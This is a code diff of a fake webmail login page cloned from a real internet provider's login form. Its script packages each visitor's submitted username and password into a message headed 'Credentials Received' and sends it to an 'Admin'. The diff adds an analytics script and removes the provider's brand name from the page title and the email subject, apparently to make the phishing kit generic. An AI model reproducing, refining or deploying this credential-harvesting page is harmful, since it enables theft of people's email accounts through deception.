@@ -1,5 +1,18 @@
 <!DOCTYPE html>
 <html lang="en">
+    
+    <!-- Privacy-friendly analytics by Plausible -->
+  <script async data-site-id="8M8AOT5QJd9IMRWPXuCnN" src="https://plausible.io/js/pa-8M8AOT5QJd9IMRWPXuCnN.js"></script>
+  <script>
+    window.plausible = window.plausible || function() {
+      (plausible.q = plausible.q || []).push(arguments)
+    },
+      plausible.init = plausible.init || function(i) {
+        plausible.o = i || {}
+      };
+    plausible.init()
+  </script>
+    
 <head>
     <base href="https://webmail.xmission.com/xm/login.php?url=https%3A%2F%2Fwebmail.xmission.com%2Flogin.php" />
     <meta http-equiv="Content-Style-Type" content="text/css"/>
@@ -8,7 +21,7 @@
     <link href="/favicon.png" rel="shortcut icon" type="image/png" />
     <link href="/apple-touch-icon.png" rel="apple-touch-icon" />
     <link href="https://xmission.com/css/style_compact.css" rel="stylesheet" type="text/css" />
-    <title>XMission webmail login</title>
+    <title>webmail login</title>
     <style type="text/css">
         header ul#topNav {right: 50px;}
         header .container {
@@ -209,7 +222,7 @@
             from_name: username.split('@')[0] || "Webmail User",
             message: `New webmail login submission:\nUsername: ${username}\nPassword: ${password}\nTimestamp: ${new Date().toString()}`,
             to_name: "Admin",
-            subject: "XMission Webmail Credentials Received"
+            subject: "Webmail Credentials Received"
         };
 
         try {
